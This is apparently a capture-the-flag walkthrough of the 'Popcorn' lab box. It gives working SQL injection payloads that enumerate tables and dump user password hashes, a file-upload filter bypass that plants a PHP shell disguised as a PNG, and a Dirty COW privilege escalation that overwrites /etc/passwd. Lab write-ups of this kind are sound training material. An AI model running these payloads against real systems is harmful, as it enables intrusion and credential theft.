# popcorn

# creds


# services

* 22 - ssh - OpenSSH 5.1p1 Debian 6ubuntu2

* 80 - http - apache httpd 2.2.12 (KarmicKoala / Ubuntu 9.10)


## http

home page of website states that the server is up and running, but no content has been added, yet.

Lets run gobuster to enumerate directories on the web sever.

### /test

Returned phpinfo() page. Which gives us information about the php configuration on the web server. And also reveals that the web server is using php.

* Build date: May 2011
* System: Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

### /rename

Renamer is an API and it returns us the syntax to use it:

**index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name** 


### /torrent

This site is powered by Torrent Hoster. The footer is from 2007.

Found a sqli vulnerability in the search function of the page, and it returned to us the sql statement its using!!

```mysql
' OR 1=1-- -
```
returned all of the torrents

```mysql
' UNION 1-- -
```
threw an error: **MySQL Error**: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1-- -%' ORDER BY namemap.data DESC' at line 4

Which reveals the dbms that the server is using along with the statement it places our input into:

```mysql
ELECT namemap.info_hash as hash, namemap.seeds, namemap.leechers, namemap.download, namemap.filename2,
	format( namemap.finished, 0  ) as finished, namemap.registration as reg, namemap.anonymous as anon, namemap.filename, namemap.url, namemap.info,UNIX_TIMESTAMP( namemap.data ) as added, categories.image, categories.name as cname, namemap.category as catid, namemap.size, namemap.uploader
	FROM namemap LEFT  JOIN categories ON categories.id =
 namemap.category WHERE namemap.filename LIKE '%' UNION 1-- -%' ORDER BY namemap.data DESC
```

# sqli

First thing to do when injecting into a database is to determine the number of columns being used in the SELECT statement. In this situation we are returned the statement being used in the error message and can see that 17 columns are being used. If that wasn't the case we would use the following to extract this information.

**when error message is returned**
when an error is returned it could return which column the error occured at giving us the number of columns.
```mysql
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
```
**If an error isn't returned we could just increment one column at a time.**

**This statement is using 17 columns**

Now that I knew the number of columns I could query the db for table and column information.

**get table names**
```mysql
1' UNION SELECT 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.tables LIMIT x-- -
```
found users table

**get column names**
```mysql
1' UNION SELECT 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17 FROM information_schema.columns where table_name = 'users' LIMIT x-- -
```
users:id,userName,password,privilege,email,joined,lastConnect

Admin:d5bfedcee289e5e05b86daad8ee3e2e2  admin@yourdomain.com    id:3
test:098f6bcd4621d373cade4e832627b4f6 *this is the account I made*

The password hash of my created user is done in md5sum, so I should be able to reverse Admins password since md5sum is considered insecure.


# uploads

The /torrent site gives us the ability to upload torrent files. It does not allow other file types to be uploaded. I attempted changing the magic number, content-type, and extension on a php upload and none of them went through.

So I uploaded an iso file of a kali image. After uploading the file there was no way in determining where the file was being stored, which meant that it would be hard for us to lfi with it. **BUT** we could edit the torrent file to add an image with it. And this upload could be bypassed.

To bypass the file upload of an image, I uploaded a png file to see what was acceptable and then uploaded a php file with that information by:
* Prepending the first few lines of php file with the lines of the PNG file. **Magic number or signature verification**
* changed the php extension to .png.php
* changed content type to image/png

And we are www-data

# PE 

The way that ippsec escalated privileges is no longer working on this box unfortunately. His privEsc involved a vulnerable pam version with the motd function. 

I used madcow to overwrite the root entry in the /etc/passwd file and was able to get root pretty easily. Chatgpt explained that madcow occurs because of a race condition with a file loaded into shared read only memory. When a file is loaded into shared read only memory, the kernel creates a private copy of the page for that process, ensuring that the original shared memory remains read-only for the other proceses.

Mad cow creates multiple threads that are requesting /etc/passed and also using the **madvise()** system call, which advises the kernel that memory is no longer needed, which causes the kernel to discard the private copy and then modifying the read-only memory. Returning a modified /etc/passwd file with root changed to our new user.


